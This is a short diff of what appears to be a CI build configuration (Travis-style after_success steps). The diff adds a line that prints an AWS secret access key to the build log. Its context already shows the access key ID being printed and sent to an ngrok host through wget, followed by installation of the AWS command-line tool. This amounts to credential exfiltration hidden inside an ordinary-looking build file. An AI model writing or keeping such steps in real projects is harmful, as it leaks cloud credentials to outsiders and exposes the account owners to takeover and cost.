@@ -15,6 +15,7 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
+  - echo $AWS_SECRET_ACCESS_KEY
   - wget http://28c8ff8a44df.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
